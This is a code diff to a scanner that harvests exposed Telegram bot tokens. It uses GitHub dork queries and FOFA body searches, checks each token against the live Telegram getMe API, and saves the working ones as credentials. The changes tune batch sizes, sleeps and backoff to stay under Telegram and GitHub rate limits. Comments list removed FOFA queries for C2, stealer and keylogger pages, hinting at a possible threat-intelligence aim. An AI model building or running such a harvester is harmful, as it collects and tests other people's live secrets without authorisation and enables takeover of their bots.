@@ -61,17 +61,35 @@ async def _save_credentials_async(results, source_name: str):
     """
     Validates token format and checks if bot is active via Telegram Bot API.
     Saves if token passes format check AND getMe - does NOT require chats.
+
+    VALIDATE_BATCH_CAP (env, default 50): max tokens validated per call.
+        Prevents hammering Telegram API when a scanner returns a large result set.
+    VALIDATE_INTER_SLEEP (env, default 0.3): seconds between getMe calls.
+        Low enough not to slow things down, high enough to avoid triggering
+        Telegram's per-IP validation rate limit (which pushes ALL bots into
+        bot_restricted cooldowns on the scraper side).
     """
     import httpx
+    import os as _os
 
     from app.services.scanners import _is_valid_token
 
+    VALIDATE_CAP = int(_os.getenv("VALIDATE_BATCH_CAP", 50))
+    INTER_SLEEP = float(_os.getenv("VALIDATE_INTER_SLEEP", 0.3))
+
     saved_count = 0
-    logger.info(f"🔍 [Batch] Validating {len(results)} potential credentials from {source_name}...")
+    capped_results = results[:VALIDATE_CAP]
+    if len(results) > VALIDATE_CAP:
+        logger.info(
+            f"🔍 [Batch] Capping validation at {VALIDATE_CAP}/{len(results)} results from {source_name} "
+            f"(set VALIDATE_BATCH_CAP env to change)"
+        )
+    else:
+        logger.info(f"🔍 [Batch] Validating {len(capped_results)} potential credentials from {source_name}...")
 
     # Use Async Client for validation
     async with httpx.AsyncClient(timeout=10.0) as client:
-        for item in results:
+        for item in capped_results:
             token = item.get("token")
             if not token or token == "MANUAL_REVIEW_REQUIRED":
                 continue
@@ -258,6 +276,10 @@ async def _save_credentials_async(results, source_name: str):
                 logger.error(f"    ❌ [Validate] Error processing token: {str(e)}")
                 pass
 
+            # Pace getMe calls to avoid Telegram per-IP rate limit.
+            # Even 0.3s × 50 = 15s extra per batch — acceptable vs bot_restricted cooldown storm.
+            await asyncio.sleep(INTER_SLEEP)
+
     logger.info(f"✅ [Batch] Finished. Saved/Updated {saved_count} credentials.")
     return saved_count
 
@@ -411,42 +433,43 @@ def scan_github(query: str = None):
 
 
 async def _scan_github_async(query: str = None):
+    # High-signal dorks only. Ordered by expected yield:
+    # 1. .env files with explicit var names — fewest false positives
+    # 2. Config files — moderate signal
+    # 3. Direct api.telegram.org/bot in source by extension — higher volume, lower precision
+    #
+    # Removed:
+    # - language:python/js/php/go patterns → too broad, GitHub secondary rate-limits on these fast
+    # - Generic "https://api.telegram.org/bot" without filename anchor → enormous result sets, slow
+    # - Duplicate token var names that resolve to same result pool
+    #
+    # GITHUB_DORK_CAP (env, default 10): max dorks per run. Increase carefully.
+    # GITHUB_QUERY_SLEEP (env, default 8): seconds between queries.
+    # Both exist so you can tune without code changes.
     default_dorks = [
-        # .env files with real token patterns (most productive)
+        # Tier 1 — highest precision: explicit var name in .env files
         'filename:.env "TELEGRAM_BOT_TOKEN"',
         'filename:.env "TG_BOT_TOKEN"',
         'filename:.env "BOT_TOKEN"',
-        'filename:.env "TELEGRAM_TOKEN"',
-        'filename:.env "api.telegram.org"',
-        # Config files
+        # Tier 2 — config files
         'filename:config.json "bot_token"',
-        'filename:config.py "bot_token"',
-        'filename:settings.py "TELEGRAM_TOKEN"',
-        'filename:config.yaml "telegram_token"',
-        'filename:config.toml "telegram_token"',
         'filename:docker-compose.yml "TELEGRAM_BOT_TOKEN"',
-        'filename:.env.local "TELEGRAM"',
         'filename:.env.production "TELEGRAM"',
-        # Direct token pattern in source — most likely to be real
+        'filename:.env.local "TELEGRAM"',
+        # Tier 3 — direct token pattern in source, scoped by extension
         '"api.telegram.org/bot" extension:py',
         '"api.telegram.org/bot" extension:js',
         '"api.telegram.org/bot" extension:php',
-        '"api.telegram.org/bot" extension:go',
-        '"api.telegram.org/bot" extension:rb',
-        # Library-specific patterns
-        'language:python "ApplicationBuilder" "token"',
-        'language:javascript "new TelegramBot" "token"',
-        'language:php "TelegramBot" "api_key"',
-        'language:go "NewBotAPI"',
-        'language:python "Bot(" extension:py',
-        # Exclude docs/examples to reduce noise
-        '"https://api.telegram.org/bot" -filename:README.md -filename:*.md -filename:dataset',
     ]
+
+    import os as _os
+    DORK_CAP = int(_os.getenv("GITHUB_DORK_CAP", 10))
+    QUERY_SLEEP = float(_os.getenv("GITHUB_QUERY_SLEEP", 8))
 
     if query:
         queries = [query]
     else:
-        queries = default_dorks
+        queries = default_dorks[:DORK_CAP]
 
     total_saved = 0
     errors = []
@@ -456,8 +479,8 @@ async def _scan_github_async(query: str = None):
         logger.warning("⏸️ [GitHub] System is PAUSED. Skipping scan.")
         return "System Paused"
 
-    logger.info(f"🐱 [GitHub] Starting scan with {len(queries)} dorks...")
-    await _send_log_async(f"🐱 [GitHub] Starting scan with {len(queries)} dorks (Full sweep)...")
+    logger.info(f"🐱 [GitHub] Starting scan with {len(queries)} dorks (cap={DORK_CAP}, sleep={QUERY_SLEEP}s)...")
+    await _send_log_async(f"🐱 [GitHub] Starting scan with {len(queries)} dorks...")
 
     for q in queries:
         logger.info(f"    🔎 [GitHub] Dorking: {q}")
@@ -469,11 +492,17 @@ async def _scan_github_async(query: str = None):
             total_saved += saved
 
         except Exception as e:
-            logger.error(f"    ❌ [GitHub] Dork failed: {str(e)}")
-            errors.append(str(e))
+            err_str = str(e)
+            logger.error(f"    ❌ [GitHub] Dork failed: {err_str}")
+            errors.append(err_str)
             errors = errors[-MAX_ERRORS_BUFFER:]
+            # Secondary rate limit — back off harder
+            if "secondary" in err_str.lower() or "rate limit" in err_str.lower():
+                logger.warning("    ⏳ [GitHub] Secondary rate limit hit — sleeping 60s")
+                await asyncio.sleep(60)
+                continue
 
-        await asyncio.sleep(5)
+        await asyncio.sleep(QUERY_SLEEP)
 
     if errors:
         logger.warning(f"⚠️ [GitHub] Completed with {len(errors)} errors.")
@@ -1056,45 +1085,25 @@ SHODAN_DEFAULT_QUERIES = [
 # Ordered by tier: existing entries first, then Tier 1 t.me, Tier 2 C2 payloads, Tier 3 malware.
 # FOFA does not support negation in the same way as Shodan/Netlas; exclusions are omitted.
 FOFA_DEFAULT_QUERIES = [
-    # ── Existing entries (retained unchanged, status_code="200" added where missing) ──
+    # ── Tier 1: Direct structural matches (highest yield) ─────────────────
+    # These anchor on the actual API path, not keyword soup.
     'body="api.telegram.org/bot" && status_code="200"',
-    'body="bot_token" && status_code="200"',
     'body="TELEGRAM_BOT_TOKEN" && status_code="200"',
+    'body="bot_token" && status_code="200"',
+    # ── Tier 2: Bot UI fingerprints ────────────────────────────────────────
     'title="Telegram Bot" && status_code="200"',
     'body="sendMessage" && body="chat_id" && status_code="200"',
-    # ── Tier 1: t.me URL pattern queries ─────────────────────────────────
+    # ── Tier 3: t.me URL patterns ──────────────────────────────────────────
     'body="http://t.me/bot" && status_code="200"',
     'body="https://t.me" && body="/start" && status_code="200"',
-    # ── Tier 2: C2 payload queries (anchored to api.telegram.org/bot) ────
-    'body="/start payload=" && body="api.telegram.org/bot" && status_code="200"',
-    'body="/start token=" && body="api.telegram.org/bot" && status_code="200"',
-    'body="/start cmd=" && body="api.telegram.org/bot" && status_code="200"',
-    'body="/start c2=" && body="api.telegram.org/bot" && status_code="200"',
-    'body="/start key=" && body="api.telegram.org/bot" && status_code="200"',
-    'body="/start id=" && body="api.telegram.org/bot" && status_code="200"',
-    'body="/start /bin/bash" && body="api.telegram.org/bot" && status_code="200"',
-    'body="/start /powershell" && body="api.telegram.org/bot" && status_code="200"',
-    'body="/start download" && body="api.telegram.org/bot" && status_code="200"',
-    'body="/start /exec" && body="api.telegram.org/bot" && status_code="200"',
-    'body="/start /run" && body="api.telegram.org/bot" && status_code="200"',
-    'body="/start /invoke" && body="api.telegram.org/bot" && status_code="200"',
-    'body="/start /script" && body="api.telegram.org/bot" && status_code="200"',
-    'body="/start http://" && body="api.telegram.org/bot" && status_code="200"',
-    'body="/start https://" && body="api.telegram.org/bot" && status_code="200"',
-    # ── Tier 3: Malware keyword queries (anchored to api.telegram.org/bot) ─
-    'body="malware" && body="api.telegram.org/bot" && status_code="200"',
-    'body="rat" && body="api.telegram.org/bot" && status_code="200"',
-    'body="remote access" && body="api.telegram.org/bot" && status_code="200"',
-    'body="spyware" && body="api.telegram.org/bot" && status_code="200"',
-    'body="stealer" && body="api.telegram.org/bot" && status_code="200"',
-    'body="keylogger" && body="api.telegram.org/bot" && status_code="200"',
-    'body="c2 server" && body="api.telegram.org/bot" && status_code="200"',
-    'body="command and control" && body="api.telegram.org/bot" && status_code="200"',
-    'body="exploit" && body="api.telegram.org/bot" && status_code="200"',
-    'body="bypass" && body="api.telegram.org/bot" && status_code="200"',
-    'body="inject" && body="api.telegram.org/bot" && status_code="200"',
-    'body="persistence" && body="api.telegram.org/bot" && status_code="200"',
-    'body="privilege escalation" && body="api.telegram.org/bot" && status_code="200"',
+    # ── Removed ────────────────────────────────────────────────────────────
+    # All 13 Tier-2/3 C2 keyword queries (c2 server, exploit, bypass, inject,
+    # persistence, malware, rat, spyware, stealer, keylogger, remote access,
+    # command and control, privilege escalation) returned 0 results across
+    # every run for 7+ hours. FOFA does not index live C2 page body content
+    # against these terms with status_code=200. Removed to cut cycle from
+    # ~84s (30 queries × 2s) down to ~14s (7 queries × 2s).
+    # Re-add if you want to experiment: each costs ~2s + FOFA API quota.
 ]
 
 
